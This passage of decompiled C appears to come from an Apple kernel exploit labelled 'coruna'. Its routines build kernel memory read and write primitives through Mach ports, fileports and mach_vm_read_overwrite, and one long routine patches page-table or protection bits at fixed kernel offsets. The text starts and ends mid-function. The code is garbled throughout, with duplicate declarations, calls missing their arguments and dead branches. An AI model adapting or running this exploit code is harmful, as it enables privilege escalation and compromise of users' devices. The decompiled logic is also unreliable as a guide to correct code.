  ls1 = _write(*(int *)(handle + 4),ctx,len);
  if (ls1 < 0) {
    ___error();
    ___error();
  }
  return;
}
void coruna_kernel5_residual_238(int *flags,void *ctx,size_t len)
{
  ssize_t ls1;
  
  ls1 = _read(*flags,ctx,len);
  if (ls1 < 0) {
    ___error();
    ___error();
  }
  return;
}
void coruna_kernel509_residual_300(long handle,long *addr_2,long off_3)
{
  int err;
  void *ptr;
  long *buf;
  long *str;
  long handle;
  unsigned long u;
  long scratch;
  long bootargs;
  
  buf = &scratch;
  if ((char)addr_2[8] == '\0') {
    if (off_3 == 0) {
      bootargs = 0;
    }
    else {
      bootargs = off_3 - (unsigned long)*(uint *)((long)addr_2 + 100);
    }
    ptr = (void *)(*addr_2 + (unsigned long)*(uint *)((long)addr_2 + 0x5c) + 0x200);
    err = *(int *)(handle + 0x168);
    buf = &bootargs;
  }
  else {
    handle = addr_2[4];
    if (handle == 0) {
      str = addr_2 + 1;
      handle = *addr_2;
    }
    else {
      str = addr_2 + 5;
    }
    err = *(int *)(handle + 0x168);
    u = (unsigned long)(uint)((int)addr_2[9] + err * 2);
    if (off_3 == 0) {
      scratch = 0;
    }
    else {
      buf = &bootargs;
      scratch = (u - (long)err) + *str;
    }
    bootargs = off_3;
    _memcpy((void *)(handle + (unsigned long)(uint)(err * 3 + (int)addr_2[9])),&scratch,(long)err);
    ptr = (void *)(handle + u);
    err = *(int *)(handle + 0x168);
  }
  _memcpy(ptr,buf,(long)err);
  return;
}
void coruna_kernel509_residual_301(uint64_t *val,int flags,unsigned long arg)
{
  bool err;
  unsigned long u;
  int *err;
  ssize_t ls4;
  long handle;
  uint size;
  
  handle = val[4];
  if (((arg & 1) != 0) || ((flags != 0 && (handle == 0)))) {
    size = 0;
    while (u = _write(*(int *)(val + 3),(void *)*val,(unsigned long)*(uint *)(val + 2)),
          u == 0xffffffffffffffff) {
      err = ___error();
      if (*err != 4) {
        return;
      }
      err = 99 < size;
      size = size + 1;
      if (err) {
        return;
      }
    }
    if (u >> 0x20 != 0) {
      return;
    }
    if (*(int *)(val + 2) != (int)u) {
      return;
    }
    u = _read(*(int *)((long)val + 0x14),(void *)*val,u & 0xffffffff);
    if (u == 0xffffffffffffffff) {
      size = 0;
      do {
        err = ___error();
        if (*err != 4) {
          return;
        }
        if (99 < size) {
          return;
        }
        size = size + 1;
        u = _read(*(int *)((long)val + 0x14),(void *)*val,(unsigned long)*(uint *)(val + 2))
        ;
      } while (u == 0xffffffffffffffff);
    }
    if (u >> 0x20 != 0) {
      return;
    }
    if (*(int *)(val + 2) != (int)u) {
      return;
    }
  }
  if (handle != 0 && flags != 0) {
    size = 0;
    while (u = _write(*(int *)(val + 7),(void *)val[4],(unsigned long)*(uint *)(val + 6)),
          u == 0xffffffffffffffff) {
      err = ___error();
      if (*err != 4) {
        return;
      }
      err = 99 < size;
      size = size + 1;
      if (err) {
        return;
      }
    }
    if (((u >> 0x20 == 0) && (*(int *)(val + 6) == (int)u)) &&
       (ls4 = _read(*(int *)((long)val + 0x34),(void *)val[4],u & 0xffffffff),
       ls4 == -1)) {
      size = 0;
      while( true ) {
        err = ___error();
        if (*err != 4) {
          return;
        }
        if (99 < size) break;
        size = size + 1;
        ls4 = _read(*(int *)((long)val + 0x34),(void *)val[4],
                      (unsigned long)*(uint *)(val + 6));
        if (ls4 != -1) {
          return;
        }
      }
      return;
    }
  }
  return;
}
void coruna_pid_for_task(uint64_t val,long handle,uint64_t id_2,int *flags)
{
  int err;
  kern_return_t lk2;
  int scratch;
  
  coruna_kernel509_residual_300();
  err = coruna_kernel509_residual_301(handle,0,1);
  if ((err == 0) &&
     (lk2 = _pid_for_task(*(mach_port_name_t *)(handle + 0x3c),&scratch), lk2 == 0)) {
    *flags = scratch;
  }
  return;
}
void coruna_mach_port_get_attributes_21b40(uint64_t val,long handle,uint64_t id_2,integer_t *arg)
{
  int err;
  kern_return_t lk2;
  integer_t scratch [2];
  
  if (*(char *)(handle + 0x40) == '\0') {
    coruna_pid_for_task(val,handle,id_2,arg);
  }
  else {
    coruna_kernel509_residual_300(val,handle);
    err = coruna_kernel509_residual_301(handle,1,0);
    if (err == 0) {
      scratch[1] = 1;
      lk2 = _mach_port_get_attributes
                        (*(ipc_space_t *)k_kernel_mach_task_self_slot,
                         *(mach_port_name_t *)(handle + 0x3c),3,scratch,
                         (mach_msg_type_number_t *)(scratch + 1));
      if (lk2 == 0) {
        *arg = scratch[0];
      }
    }
  }
  return;
}
void coruna_kernel509_via_mach_port_get_attributes_21b40(uint64_t val,uint64_t id_2,long handle,uint64_t *size_3)
{
  int err;
  uint32_t scratch;
  uint32_t scratch;
  
  err = coruna_mach_port_get_attributes_21b40();
  if ((err == 0) && (err = coruna_mach_port_get_attributes_21b40(val,id_2,handle + 4,&scratch), err == 0)) {
    *size_3 = coruna_u64_pack((scratch), (scratch));
  }
  return;
}
void coruna_kernel509_via_mach_port_get_attributes_21b40_2(long handle,long addr_2,unsigned long arg,uint size,unsigned long *arg)
{
  uint u;
  unsigned long size;
  int err;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  unsigned long type_id;
  unsigned long type_id_8;
  uint scratch;
  
  version = coruna_kernel509_residual_313();
  if (((int)version != 0) && (arg != 0)) {
    port = coruna_kernel509_residual_317(handle,version,version);
    tag = coruna_kernel509_residual_318(handle,arg,version,port);
    if (tag != 0) {
      kind = *(unsigned long *)(handle + 0x158);
      for (type_id_8 = arg; tag <= type_id_8; type_id_8 = type_id_8 - (version & 0xffffffff)) {
        if (addr_2 == 0) {
          err = coruna_kernel509_via_mach_vm_read_overwrite(handle,type_id_8,&scratch);
          if (err != 1) {
            return;
          }
        }
        else {
          err = coruna_mach_port_get_attributes_21b40(handle,addr_2,type_id_8,&scratch);
          if (err != 0) {
            return;
          }
        }
        u = scratch & 0x3ff;
        if (kind < 0x1c1b1914600000) {
          *arg = type_id_8;
          return;
        }
        else if ((size == 2) && (u == 2)) {
          err = coruna_kernel509_via_kernel509_via_mach_port_get_attributes_21b40(handle,addr_2,scratch,type_id_8);
          *arg = type_id_8;
          return;
        }
        *arg = type_id_8;
        return;
      }
      type_id_8 = arg;
      do {
        do {
          while( true ) {
            type_id_8 = (version & 0xffffffff) + type_id_8;
            if (((port & 0xffffffff) - (version & 0xffffffff)) + tag < type_id_8) {
              return;
            }
            if (addr_2 == 0) {
              err = coruna_kernel509_via_mach_vm_read_overwrite(handle,type_id_8,&scratch);
              if (err != 1) {
                return;
              }
            }
            else {
              err = coruna_mach_port_get_attributes_21b40(handle,addr_2,type_id_8,&scratch);
              if (err != 0) {
                return;
              }
            }
            u = scratch & 0x3ff;
            if (kind < 0x1c1b1914600000) break;
            if ((size == 2) && (u == 2)) {
              err = coruna_kernel509_via_kernel509_via_mach_port_get_attributes_21b40(handle,addr_2,scratch,type_id_8);
              *arg = type_id_8;
              return;
            }
            else if (u == size) {
fail:
              *arg = type_id_8;
              return;
            }
          }
          *arg = type_id_8;
          return;
        } while (u == 0x11);
        size = 0;
        do {
          type_id = size;
          if (type_id == 9) break;
          size = type_id + 1;
        } while ((&k_kernel_rodata_word_43504)[type_id] != u);
      } while (type_id < 9);
    }
  }
  return;
}
void coruna_kernel509_via_kernel509_via_mach_port_get_attributes_21b40(uint64_t val,long handle,uint size,uint64_t id_2)
{
  int err;
  uint u;
  long handle;
  long scratch;
  
  if (((size & 0x7ff) == 2) && (scratch = coruna_fn_ptr_cast_6(val,id_2), scratch != 0)) {
    if (handle == 0) {
      err = coruna_kernel509_residual_307(val,scratch,&scratch);
      if (err != 1) {
        return;
      }
    }
    else {
      err = coruna_kernel509_via_mach_port_get_attributes_21b40(val,handle,scratch,&scratch);
      if (err != 0) {
        return;
      }
      scratch = coruna_kernel509_via_fn_ptr_cast_10_9(val,scratch);
    }
    handle = coruna_fn_ptr_cast_2(val,scratch);
    if ((handle != 0) && (u = coruna_fn_ptr_cast_9(val), u != 0)) {
      if (handle == 0) {
        err = coruna_kernel509_residual_307(val,scratch + (unsigned long)u,&scratch);
        if (err != 1) {
          return;
        }
        err = coruna_kernel509_residual_307(val,scratch + 0x20,&scratch);
        if (err != 1) {
          return;
        }
      }
      else {
        err = coruna_kernel509_via_mach_port_get_attributes_21b40(val,handle,scratch + (unsigned long)u,&scratch);
        if (err != 0) {
          return;
        }
        scratch = coruna_kernel509_via_fn_ptr_cast_10_9(val,scratch);
        err = coruna_kernel509_via_mach_port_get_attributes_21b40(val,handle,scratch + 0x20,&scratch);
        if (err != 0) {
          return;
        }
      }
      coruna_fn_ptr_cast_2(val,scratch);
    }
  }
  return;
}
void coruna_call_return_zero_61a8_22134(void)
{
  coruna_kernel509_via_mach_port_get_attributes_21b40_2();
  return;
}
void coruna_kernel509_via_fileport_makeport(long handle,uint64_t val)
{
  int err;
  long handle;
  int scratch;
  uint32_t bootargs;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f53) {
    if (err != 0x1809 && err != 0x1c1b) {
      return;
    }
  }
  else if (1 < err - 0x1f53U && err != 0x2258) {
    return;
  }
  err = coruna_fileport_makeport(val,&bootargs);
  if ((err == 0) && (handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle,bootargs), handle != 0)) {
    err = coruna_kernel509_via_mach_vm_read_overwrite(handle,handle + 0x14,&scratch);
    if ((err != 0) && (scratch - 1U < 10)) {
      coruna_mach_vm_machine_attribute(handle,handle + 0x14,0xffff);
    }
  }
  return;
}
void coruna_mach_absolute_time(long handle)
{
  uint64_t *ptr;
  unsigned long u;
  uint64_t size;
  long handle;
  
  handle = *(long *)(handle + 0x868);
  size = _mach_absolute_time();
  if (handle != 0) {
    u = 0;
    if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
      u = ((size - *(long *)(handle + 0x868)) * (unsigned long)*(uint *)(handle + 0x25c)) /
              (unsigned long)*(uint *)(handle + 0x260);
    }
    if (u < 0x12a153440) {
      return;
    }
    handle = 0;
    do {
      ptr = (uint64_t *)(handle + 0x5e8 + handle);
      ptr[4] = 0;
      ptr[1] = 0;
      *ptr = 0;
      ptr[3] = 0;
      ptr[2] = 0;
      handle = handle + 0x28;
    } while (handle != 0x280);
    size = _mach_absolute_time();
  }
  *(uint64_t *)(handle + 0x868) = size;
  return;
}
void coruna_kernel509_residual_302(uint64_t val)
{
  long handle;
  
  handle = coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_4();
  if (handle != 0) {
    coruna_kernel509_via_fn_ptr_cast_2_11(val,handle);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_6(long handle,unsigned long arg,long *addr_2,uint64_t val)
{
  bool err;
  int err;
  long handle;
  uint32_t u;
  uint8_t size;
  uint version;
  unsigned long port;
  long addr;
  uint64_t tag;
  long off;
  long base;
  uint64_t scratch;
  unsigned long bootargs;
  
  if (addr_2 == (long *)0x0) {
    return;
  }
  addr = 0;
  addr_2[4] = 0;
  addr_2[1] = 0;
  *addr_2 = 0;
  addr_2[3] = 0;
  addr_2[2] = 0;
  do {
    handle = *(long *)(handle + addr + 0x5e8);
    if (handle == 0) break;
    port = *(unsigned long *)(handle + addr + 0x5f0);
    if ((port <= arg) && (arg < port + *(uint *)(handle + addr + 0x5f8))) {
      err = coruna_kernel509_via_mach_vm_read_overwrite_3(handle,handle,8,handle + addr + 0x608,val);
      if (err != 0) {
        handle = handle + addr;
        handle = *(long *)(handle + 0x5f0);
        addr = *(long *)(handle + 0x5e8);
        base = *(long *)(handle + 0x600);
        off = *(long *)(handle + 0x5f8);
        addr_2[4] = *(long *)(handle + 0x608);
        addr_2[1] = handle;
        *addr_2 = addr;
        addr_2[3] = base;
        addr_2[2] = off;
        return;
      }
      break;
    }
    addr = addr + 0x28;
  } while (addr != 0x280);
  if (*(long *)(handle + 0x5d0) == 0) {
    addr = coruna_kernel509_residual_302(handle);
    if (addr == 0) {
      return;
    }
    err = coruna_kernel509_residual_307(handle,addr,&bootargs);
    if (err == 0) {
      return;
    }
    err = coruna_kernel509_residual_307(handle,addr + *(int *)(handle + 0x168),&scratch);
    if (err == 0) {
      return;
    }
    u = 0x200;
    if (*(int *)(handle + 0x180) != 0x1000) {
      u = 0x800;
    }
    *(unsigned long *)(handle + 0x5d0) = bootargs;
    *(uint64_t *)(handle + 0x5d8) = scratch;
    *(uint32_t *)(handle + 0x5e0) = u;
    coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_11(handle);
  }
  if ((*(int *)(handle + 0x180) == 0x1000) || (err = coruna_fn_ptr_cast_10(handle,0x8000), err != 0)) {
    handle = *(long *)(handle + 0x5d0);
    tag = *(uint64_t *)(handle + 0x5d8);
    addr = coruna_kernel509_residual_314(handle,handle,tag,tag);
    port = arg >> 0x1b & 0x7f8;
    err = coruna_kernel509_via_mach_vm_read_overwrite_3(handle,handle + port,8,&bootargs,val);
    err = false;
    if (err) {
    addr = 0;
    do {
    if (*(long *)(handle + 0x5e8 + addr) == 0) {
    handle = handle + addr;
    handle = addr_2[1];
    addr = *addr_2;
    base = addr_2[3];
    off = addr_2[2];
    *(long *)(handle + 0x608) = addr_2[4];
    *(long *)(handle + 0x5f0) = handle;
    *(long *)(handle + 0x5e8) = addr;
    *(long *)(handle + 0x600) = base;
    *(long *)(handle + 0x5f8) = off;
    return;
    }
    addr = addr + 0x28;
    } while (addr != 0x280);
    }
    return;
  }
  else {
    if (*(int *)(handle + 0x180) != 0x4000) {
      return;
    }
    addr = *(long *)(handle + 0x5d0);
    tag = *(uint64_t *)(handle + 0x5d8);
    err = coruna_fn_ptr_cast_10(handle,0x5000008);
    port = 7;
    if (err != 0) {
      port = 0x7ff;
    }
    err = coruna_kernel509_via_mach_vm_read_overwrite_3(handle,addr + (port & arg >> 0x24) * 8,8,&bootargs,val);
    err = false;
    if (err) {
    addr = 0;
    do {
    if (*(long *)(handle + 0x5e8 + addr) == 0) {
    handle = handle + addr;
    handle = addr_2[1];
    addr = *addr_2;
    base = addr_2[3];
    off = addr_2[2];
    *(long *)(handle + 0x608) = addr_2[4];
    *(long *)(handle + 0x5f0) = handle;
    *(long *)(handle + 0x5e8) = addr;
    *(long *)(handle + 0x600) = base;
    *(long *)(handle + 0x5f8) = off;
    return;
    }
    addr = addr + 0x28;
    } while (addr != 0x280);
    }
    return;
  }
done:
  err = false;
fail:
  if (err) {
    addr = 0;
    do {
      if (*(long *)(handle + 0x5e8 + addr) == 0) {
        handle = handle + addr;
        handle = addr_2[1];
        addr = *addr_2;
        base = addr_2[3];
        off = addr_2[2];
        *(long *)(handle + 0x608) = addr_2[4];
        *(long *)(handle + 0x5f0) = handle;
        *(long *)(handle + 0x5e8) = addr;
        *(long *)(handle + 0x600) = base;
        *(long *)(handle + 0x5f8) = off;
        return;
      }
      addr = addr + 0x28;
    } while (addr != 0x280);
  }
  return;
}
void coruna_call_mach_vm_machine_attribute_1d4f8_22818(void)
{
  coruna_kernel509_via_fn_ptr_cast_10_6();
  return;
}
void coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_6(uint64_t val,uint64_t id_2)
{
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  
  bootargs = 0;
  scratch = 0;
  scratch = 0;
  thread_attr = 0;
  bootargs = 0;
  coruna_kernel509_via_fn_ptr_cast_10_6(val,id_2,&scratch,1);
  return;
}
void coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_6_2(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  
  bootargs = 0;
  scratch = 0;
  scratch = 0;
  thread_attr = 0;
  bootargs = 0;
  coruna_kernel509_via_fn_ptr_cast_10_6(val,id_2,&scratch,size_3);
  return;
}
void coruna_kernel5_residual_240(uint64_t val,uint64_t *id_2)
{
  if (id_2 != (uint64_t *)0x0) {
    if ((void *)id_2[3] != (void *)0x0) {
      _free((void *)id_2[3]);
    }
    id_2[1] = 0;
    *id_2 = 0;
    id_2[3] = 0;
    id_2[2] = 0;
    _free(id_2);
    return;
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_5(long handle,uint64_t *val)
{
  uint *ptr;
  void **lppv2;
  char *ptr;
  uint u;
  uint size;
  uint version;
  void *ptr;
  int err;
  int status;
  uint64_t *buf;
  void *buf;
  void *str;
  long handle;
  uint64_t port;
  void *copy;
  uint tag;
  unsigned long kind;
  void *data;
  unsigned long type_id;
  uint64_t type_id_8;
  uint64_t type_id_9;
  void *scratch;
  int bootargs;
  uint32_t scratch;
  long thread_attr;
  void *host_info;
  long serial_buf;
  long action;
  long block_ctx;
  long stack_guard;
  uint32_t sa_saved;
  uint32_t bootargs;
  uint32_t sa_new;
  uint32_t thread_attr;
  uint32_t host_info;
  uint serial_buf;
  void *path_buf;
  long tmp_buf;
  long region;
  uint32_t action;
  uint32_t block_ctx;
  uint32_t plist;
  uint32_t stack_guard;
  uint32_t sa_saved;
  uint url_buf;
  long json_buf;
  
  json_buf = *(long *)k_kernel_stack_chk_guard_slot;
  buf = _calloc(0x20,1);
  if (*(long *)k_kernel_stack_chk_guard_slot != json_buf) {
  ___stack_chk_fail();
  }
  return;
}
void coruna_kernel5_residual_241(uint64_t val,long handle,void *ctx,uint size)
{
  int err;
  int status;
  unsigned long u;
  long handle;
  unsigned long size;
  
  if ((((handle != 0) && (handle = *(long *)(handle + 0x18), handle != 0)) &&
      (u = (unsigned long)*(uint *)(handle + 0x10), *(uint *)(handle + 0x10) != 0)) &&
     (*(uint *)(handle + 8) == size)) {
    size = 0;
    err = *(int *)(handle + 0xc);
    do {
      u = u - 1;
      status = _memcmp((void *)(handle + size),ctx,(unsigned long)size);
      size = (unsigned long)((int)size + err + size);
    } while (status != 0 && u != 0);
  }
  return;
}
void coruna_qsort(uint64_t val,long handle,void *ctx,unsigned long arg)
{
  int err;
  int status;
  uint u;
  unsigned long size;
  int *err;
  void *ptr;
  long handle;
  
  if ((((handle != 0) && (handle = *(long *)(handle + 0x18), handle != 0)) &&
      (*(int *)(handle + 8) == (int)arg)) &&
     ((size = coruna_kernel5_residual_241(val,handle,ctx,arg), (size & 1) == 0 &&
      (*(uint *)(handle + 0x10) < 0x400)))) {
    ptr = (void *)(handle + (unsigned long)((*(int *)(handle + 0xc) + (int)arg) *
                                     *(uint *)(handle + 0x10)));
    _memcpy(ptr,ctx,arg & 0xffffffff);
    *(int *)(handle + 0x10) = *(int *)(handle + 0x10) + 1;
    if (*(int *)(handle + 0xc) == 2) {
      *(uint8_t *)((long)ptr + (unsigned long)*(uint *)(handle + 8)) = 2;
      *(uint8_t *)((long)ptr + (unsigned long)(*(int *)(handle + 8) + 1)) = 0;
    }
    ptr = *(void **)(handle + 0x18);
    if ((ptr != (void *)0x0) && (u = *(uint *)(handle + 0x10), u != 0)) {
      err = *(int *)(handle + 8);
      status = *(int *)(handle + 0xc);
      err = (int *)coruna_kernel509_via_helper_5d2c_419fc(coruna_kernel5_residual_242);
      _qsort(ptr,(unsigned long)u,(unsigned long)(uint)(status + err),err);
    }
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_4(long handle,long *addr_2)
{
  long handle;
  int err;
  unsigned long u;
  
  if (((addr_2 != (long *)0x0) && (addr_2[3] != 0)) && (*addr_2 != 0)) {
    u = *(unsigned long *)(handle + 0x158) >> 0x2b;
    handle = 0x40;
    if (u < 1099) {
      handle = 0x30;
    }
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle + *addr_2,addr_2[3],
                         (*(int *)((long)addr_2 + 0xc) + (int)addr_2[1]) * (int)addr_2[2]);
    if (err != 0) {
      handle = 0x3c;
      if (u < 1099) {
        handle = 0x2c;
      }
      coruna_mach_vm_machine_attribute(handle,*addr_2 + handle,(int)addr_2[2]);
    }
  }
  return;
}
void coruna_kernel509_via_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_4(uint64_t val,uint size,int flags,long handle)
{
  uint64_t u;
  uint64_t size;
  unsigned long version;
  uint64_t scratch;
  
  scratch = 0;
  if ((flags == 0x14) &&
     (size = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_5(val,&scratch), u = scratch, (int)size == 0)) {
    if (size != 0) {
      version = 0;
      do {
        size = coruna_qsort(size,u,handle + (version & 0xfffffffc),0x14);
        if ((int)size != 0) goto fail;
        version = version + 0x14;
      } while ((unsigned long)size * 0x14 - version != 0);
    }
    size = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_4(val,u);
fail:
    coruna_kernel5_residual_240(size,u);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_4(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_kernel509_via_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_4(val,1,size_3,id_2);
  return;
}
void coruna_kernel5_residual_242(long handle,long addr_2)
{
  long handle;
  
  handle = 0;
  while( true ) {
    if (*(byte *)(handle + handle) < *(byte *)(addr_2 + handle)) {
      return;
    }
    if (*(byte *)(addr_2 + handle) < *(byte *)(handle + handle)) break;
    handle = handle + 1;
    if (handle == 0x14) {
      return;
    }
  }
  return;
}
void coruna_call_helper_25fa0_stub(long handle)
{
  coruna_call_helper_25fa0(*(uint64_t *)(handle + 0x20));
  return;
}
void coruna_ret_stub_3(long handle)
{
  coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(*(uint64_t *)(handle + 0x20));
  return;
}
void coruna_fn_ptr_cast_4(void)
{
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_7(uint64_t val,unsigned long arg,int flags)
{
  uint u;
  bool err;
  long handle;
  int err;
  int status;
  int flags;
  int count;
  unsigned long size;
  long *ptr;
  long addr;
  unsigned long version;
  uint port;
  unsigned long tag;
  uint16_t *ptr;
  long off;
  unsigned long kind;
  uint64_t type_id;
  uint64_t type_id_8;
  unsigned long type_id_9;
  uint type_id_10;
  unsigned long type_id_11;
  unsigned long type_id_12;
  uint64_t scratch;
  uint64_t *bootargs;
  uint8_t thread_attr[64];
  long host_info [7];
  long serial_buf [7];
  uint64_t action;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t block_ctx;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t stack_guard[4];
  uint64_t sa_saved;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t path_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  err = coruna_fn_ptr_cast_10(val,0x2200000);
  tag = 0x206000000;
  if (err != 0) {
    tag = 0x406000000;
  }
  status = coruna_fn_ptr_cast_10(val,0x2200000);
  err = 0xe;
  if (status != 0) {
    err = 0xf;
  }
  status = coruna_fn_ptr_cast_10(val,0x1000000);
  if (status == 0) {
    status = coruna_fn_ptr_cast_10(val,0x2200000);
    type_id_11 = 0x3fffff;
    if (status != 0) {
      type_id_11 = 0x3ffffff;
    }
  }
  else {
    type_id_11 = 0x7ffffff;
  }
  status = coruna_mach_absolute_time_18864(val,1);
  if (status != 0) {
    status = coruna_mach_absolute_time_18960(val);
    if ((status == 0) && (status = coruna_mach_make_memory_entry_2aed0(val,tag | 0x140000,host_info), status == 0)) {
      status = coruna_mach_make_memory_entry_2aed0(val,tag | 0x150000,serial_buf);
      if (status == 0) {
        status = coruna_kernel5_via_mach_port_deallocate_2b24c(val,tag,thread_attr);
        handle = serial_buf[0];
        if (status != 0) {
          tag = *(unsigned long *)(host_info[0] + 0x108);
          type_id = *(uint64_t *)(serial_buf[0] + 0x40);
          type_id_8 = *(uint64_t *)(serial_buf[0] + 0x48);
          status = coruna_fn_ptr_cast_10(val,0x1100000);
          if (status == 0) {
            scratch = 0;
            bootargs = (uint64_t *)0x0;
          }
          else {
            bootargs = (uint64_t *)(serial_buf[0] + 0x20);
            scratch = *bootargs;
            *bootargs = 1;
          }
          size = coruna_call_mach_vm_machine_attribute_1d4f8_22818_stub(val);
          if (size == 0) {
            err = false;
          }
          else {
            kind = arg & 0x3f;
            status = 0;
            do {
              flags = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(val,arg & 0xffffffffffffffc0,0x40,&action);
              if (flags == 0) break;
              if (status == 0) {
fail:
                sa_new = scratch;
                sa_new = action;
                tmp_buf = thread_attr;
                path_buf = bootargs;
                region = host_info;
                path_buf = block_ctx;
                url_buf = action;
                plist = serial_buf;
                stack_guard[1] = scratch;
                stack_guard[0] = action;
                stack_guard[3] = thread_attr;
                stack_guard[2] = bootargs;
                block_ctx = host_info;
                sa_saved = block_ctx;
                sa_saved = action;
                stack_guard = serial_buf;
                *(int *)((long)stack_guard + kind) = flags;
              }
              else {
                flags = _memcmp(&sa_new,&action,0x40);
                if (flags != 0) {
                  flags = _memcmp(&action,stack_guard,0x40);
                  if ((flags != 0) && (*(int *)((long)&action + kind) != flags))
                  goto fail;
                  err = false;
                  goto done;
                }
              }
              flags = coruna_mach_absolute_time_18cfc(val,thread_attr);
              if (flags == 0) break;
              *(unsigned long *)(host_info[0] + 0x108) =
                   *(unsigned long *)(host_info[0] + 0x108) | 0x8000000000000001;
              while ((~*(unsigned long *)(host_info[0] + 0x108) & 0x8000000000000001) != 0) {
                coruna_semaphore_timedwait(val,100);
              }
              *(unsigned long *)(host_info[0] + 8) = *(unsigned long *)(host_info[0] + 8) & 0xefffffffffffffff;
              *(unsigned long *)(host_info[0] + 0x108) =
                   *(unsigned long *)(host_info[0] + 0x108) & (tag | 0x8000000000000000);
              while ((*(unsigned long *)(host_info[0] + 0x108) & 0x8000000000000001) != 0) {
                coruna_semaphore_timedwait(val,100);
              }
              addr = 0;
              *(unsigned long *)(handle + 0x40) =
                   (unsigned long)((-1 << err & 0x4000U ^ 0x7fc0) & (uint)size | 0x2000000);
              do {
                *(uint64_t *)(handle + 0x48) = *(uint64_t *)((long)stack_guard + addr);
                addr = addr + 8;
              } while (addr != 0x40);
              addr = 0;
              type_id_12 = 0;
              ptr = &k_kernel_rodata_word_43558;
              do {
                off = 0;
                do {
                  if ((*(uint *)((long)stack_guard + addr * 4) >> (unsigned long)((uint)off & 0x1f) & 1)
                      != 0) {
                    type_id_12 = (unsigned long)((uint)(ushort)ptr[off] ^ (uint)type_id_12);
                  }
                  off = off + 1;
                } while (off != 0x20);
                addr = addr + 1;
                ptr = ptr + 0x20;
              } while (addr != 8);
              addr = 0;
              type_id_9 = 0;
              ptr = &k_kernel_rodata_word_43558;
              do {
                off = 0;
                do {
                  if ((*(uint *)((long)&sa_saved + addr * 4) >> (unsigned long)((uint)off & 0x1f) & 1)
                      != 0) {
                    type_id_9 = (unsigned long)((uint)(ushort)ptr[off] ^ (uint)type_id_9);
                  }
                  off = off + 1;
                } while (off != 0x20);
                addr = addr + 1;
                ptr = ptr + 0x20;
              } while (addr != 8);
              flags = coruna_fn_ptr_cast_10(val,0x84001);
              count = coruna_fn_ptr_cast_10(val,0x2200000);
              if (count != 0) {
                type_id_10 = (uint)type_id_12;
                version = size >> 0x25 & 0x1f | (unsigned long)(type_id_10 & 0x3e0);
                if ((uint)version != type_id_10) {
                  port = 10;
                  do {
                    u = ((uint)version ^ type_id_10) & 0xffff;
                    u = u ^ u >> 8;
                    u = u ^ u >> 4;
                    u = u ^ u >> 2;
                    type_id_12 = version;
                    if (((u ^ u >> 1) & 1) == 0) break;
                    port = port - 1;
                    version = (unsigned long)((uint)version ^ 1 << (unsigned long)(port & 0x1f));
                    type_id_12 = version;
                  } while (5 < port);
                }
              }
              addr = 8;
              if (flags != 0) {
                addr = 0x28;
              }
              *(unsigned long *)(handle + 0x48) =
                   (size >> err & type_id_11) << 0x12 | type_id_9 << 0x32 | (type_id_12 & 0xffff) << addr
                   | 0x1f;
              *(unsigned long *)(host_info[0] + 0x108) =
                   *(unsigned long *)(host_info[0] + 0x108) | 0x8000000000000001;
              while ((~*(unsigned long *)(host_info[0] + 0x108) & 0x8000000000000001) != 0) {
                coruna_semaphore_timedwait(val,100);
              }
              *(unsigned long *)(host_info[0] + 8) = *(unsigned long *)(host_info[0] + 8) | 0x1000000000000000;
              flags = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(val,arg,4,(long)&action + kind);
              if ((flags == 0) || (*(int *)((long)&action + kind) == flags)) {
cleanup:
                err = true;
                goto done;
              }
              *(unsigned long *)(host_info[0] + 0x108) =
                   *(unsigned long *)(host_info[0] + 0x108) & (tag | 0x8000000000000000);
              while ((*(unsigned long *)(host_info[0] + 0x108) & 0x8000000000000001) != 0) {
                coruna_semaphore_timedwait(val,100);
              }
              type_id_12 = coruna_mach_absolute_time_2045c(val,thread_attr);
              if ((type_id_12 & 1) == 0) goto cleanup;
              status = status + 1;
            } while (status != 0x10);
            err = false;
          }
done:
          if ((tag != 0) && (*(unsigned long *)(host_info[0] + 0x108) != tag)) {
            *(unsigned long *)(host_info[0] + 0x108) =
                 *(unsigned long *)(host_info[0] + 0x108) & (tag | 0x8000000000000000);
          }
          *(uint64_t *)(handle + 0x40) = type_id;
          *(uint64_t *)(handle + 0x48) = type_id_8;
          err = coruna_fn_ptr_cast_10(val,0x1100000);
          if (err != 0) {
            *bootargs = scratch;
          }
          if (err) {
            coruna_mach_absolute_time_2045c(val,thread_attr);
          }
          coruna_mach_port_deallocate_2b24c(val,thread_attr);
        }
        coruna_mach_port_deallocate_2b24c(val,host_info);
